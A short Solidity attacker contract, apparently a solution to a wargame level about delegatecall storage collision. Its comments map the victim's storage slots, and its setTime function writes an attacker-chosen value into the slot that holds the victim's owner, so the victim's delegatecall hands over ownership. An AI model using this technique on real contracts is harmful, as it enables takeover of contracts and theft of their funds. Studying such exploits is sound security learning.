// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

contract AttackPreservation is Ownable {
    // original layout of the contract:
    // address timeZone1Library | slot 0
    // address timeZone2Library | slot 1
    // address owner            | slot 2
    // uint256 storedTime       | slot 3

    // new layout of the contract:
    // address _owner          | slot 0 (from Ownable)
    address[2] private tz; //  | slots 1, 2

    constructor() Ownable(msg.sender) {}

    function setTime(uint256 _time) public {
        // rewrites the owner slot
        tz[1] = address(uint160(_time));
    }

    function finish() external onlyOwner {
        selfdestruct(payable(owner())); // selfdestruct is deprecated
    }
}
